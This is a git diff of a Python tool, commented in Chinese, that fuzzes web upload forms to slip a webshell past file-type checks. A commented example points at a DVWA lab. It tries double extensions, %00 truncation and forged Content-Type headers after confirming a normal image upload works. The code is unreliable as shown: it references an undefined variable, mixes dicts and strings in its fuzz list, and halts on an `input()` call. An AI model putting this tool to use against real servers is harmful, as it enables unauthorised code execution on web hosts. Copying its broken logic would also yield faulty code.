@@ -16,14 +16,16 @@ def get_form_data_post_info(url, cookie):
     # return_value['form_file_param_name']为multipart form data中的文件参数名
     form_data_dict = {}
     form_file_param_name = ''
+    origin_html=''
     return_value = {'form_data_dict': form_data_dict,
-                    'form_file_param_name': form_file_param_name}
+                    'form_file_param_name': form_file_param_name,
+                    'origin_html':origin_html}
     rsp = get_request(url, cookie=cookie)
-    html = rsp['content']
-    if not re.search(r"<form\s+", html, re.I):
+    origin_html = rsp['content']
+    if not re.search(r"<form\s+", origin_html, re.I):
         print("Sorry,I can't find any form.")
         sys.exit(1)
-    param_part = get_param_part_from_content(html)
+    param_part = get_param_part_from_content(origin_html)
     param_list = param_part.split("&")
     for param_and_value in param_list:
         _ = param_and_value.split("=")
@@ -38,6 +40,7 @@ def get_form_data_post_info(url, cookie):
 
     return_value['form_data_dict'] = form_data_dict
     return_value['form_file_param_name'] = form_file_param_name
+    return_value['origin_html']=origin_html
     return return_value
 
 
@@ -84,42 +87,59 @@ def post_multipart_form_data(url, cookie, form_data_dict, boundary, form_file_pa
     return return_value
 
 
-def check_normal_upload(url, cookie, form_data_dict, boundary, form_file_param_name, file_content, filename, content_type):
-    suffix_list = ['jpg', 'png', 'gif', 'text/plain']
-    for suffix in suffix_list:
-        filename = "test.%s" % suffix
-        rsp = post_multipart_form_data(
-            url, cookie, form_data_dict, boundary, form_file_param_name, file_content, filename, content_type)
-        if rsp['code'] == 200:
-            return suffix
-    print("正常上传jpg/gif/png全部失败,这个url的上传功能可能存在问题...")
+def get_work_file_suffix(url, cookie, form_data_dict, boundary, form_file_param_name, filename, content_type):
+    file_suffix_list = ['jpg', 'png', 'gif', 'txt']
+    for file_suffix in file_suffix_list:
+        filename = "test.%s" % file_suffix
+        if file_suffix == 'jpg':
+            file_content = jpg_file_content
+            rsp = post_multipart_form_data(
+                url, cookie, form_data_dict, boundary, form_file_param_name, file_content, filename, content_type)
+            if rsp['code'] == 200:
+                return {'file_suffix': 'jpg', 'content_type': 'image/jpeg', 'file_content': jpg_file_content}
+        elif file_suffix == 'png':
+            file_content = png_file_content
+            rsp = post_multipart_form_data(
+                url, cookie, form_data_dict, boundary, form_file_param_name, file_content, filename, content_type)
+            if rsp['code'] == 200:
+                return {'file_suffix': 'png', 'content_type': 'image/png', 'file_content': png_file_content}
+        elif file_suffix == 'gif':
+            file_content = gif_file_content
+            rsp = post_multipart_form_data(
+                url, cookie, form_data_dict, boundary, form_file_param_name, file_content, filename, content_type)
+            if rsp['code'] == 200:
+                return {'file_suffix': 'gif', 'content_type': 'image/gif', 'file_content': gif_file_content}
+        elif file_suffix == 'txt':
+            file_content = gif_file_content
+            rsp = post_multipart_form_data(
+                url, cookie, form_data_dict, boundary, form_file_param_name, file_content, filename, content_type)
+            if rsp['code'] == 200:
+                return {'file_suffix': 'txt', 'content_type': 'text/plain', 'file_content': gif_file_content}
+    print("正常上传jpg/gif/png/txt全部失败,这个url的上传功能可能存在问题...")
     sys.exit(1)
+
+def check_upload_succeed(rsp,origin_html):
+    code=rsp['code']
+    html=rsp['html']
+    if code!=200:
+        return False
+    for line in html:
+        if not re.match(r"\s+",line) and line not in origin_html:
+            print(line)
+    input()
+
 
 
 def fuzz_upload_webshell():
     # url = 'http://192.168.135.39/dvwa/vulnerabilities/upload/'
     # cookie = 'security=low; PHPSESSID=cl4u4quib5tebhico07nopn2o0'
-    parser = argparse.ArgumentParser()
-    parser.add_argument("-u", "--url")
-    parser.add_argument("--cookie")
-    parser.add_argument("--suffix")
-    args = parser.parse_args()
-    url = args.url
-    cookie = args.cookie
-    suffix = args.suffix
-    info = get_form_data_post_info(url, cookie)
-    form_data_dict = info['form_data_dict']
-    form_file_param_name = info['form_file_param_name']
-    boundary = '-------------------------7df3069603d6'
-    file_content = '''GIF89a
-    somethin'''
     filename = "file.jpg.php"
     content_type = 'image/jpeg'
-    works_suffix=check_normal_upload(url, cookie, form_data_dict, boundary,
-                        form_file_param_name, file_content, filename, content_type)
+    work_file_suffix = get_work_file_suffix(url, cookie, form_data_dict, boundary,
+                                            form_file_param_name, filename, content_type)
     fuzz_file_name = [
         {'desc': '修改后缀为webshell后缀',
-            'modify': 'filename=test.%s\r\nContent-Type: image/jpeg' % suffix},
+            'modify': {'filename': 'test.%s' % script_suffix}},
         {'desc': '修改后缀为.jpg;test.php',
             'modify': 'filename=test.%s\r\nContent-Type: image/jpeg' % suffix},
         {'desc': '%00截断', 'modify': 'filename=test.%s\r\nContent-Type: image/jpeg' % suffix},
@@ -145,12 +165,37 @@ def fuzz_upload_webshell():
         {'desc': '修改content-type为xxx/xxx',
             'modify': 'filename=test.%s\r\nContent-Type: image/jpeg' % suffix},
     ]
-    for filename in fuzz_file_name:
-        content_type="works_suffix's content_type"
+    for each in fuzz_file_name:
+        filename = each['modify']['filename']
+        content_type = work_file_suffix['content_type']
+        file_content = work_file_suffix['file_content']
         rsp = post_multipart_form_data(
             url, cookie, form_data_dict, boundary, form_file_param_name, file_content, filename, content_type)
-        if rsp['code'] == 200:
-            return
+        check_upload_succeed(rsp,origin_html)
+
+
+parser = argparse.ArgumentParser()
+parser.add_argument("-u", "--url")
+parser.add_argument("--cookie")
+parser.add_argument("--suffix")
+args = parser.parse_args()
+url = args.url
+cookie = args.cookie
+script_suffix = args.suffix
+gif_file_content = '''GIF89a
+somethin'''
+jpg_file_content = '''
+
+'''
+png_file_content = '''
+
+'''
+info = get_form_data_post_info(url, cookie)
+form_data_dict = info['form_data_dict']
+form_file_param_name = info['form_file_param_name']
+origin_html=info['origin_html']
+boundary = '-------------------------7df3069603d6'
+
 
 if __name__ == "__main__":
     fuzz_upload_webshell()
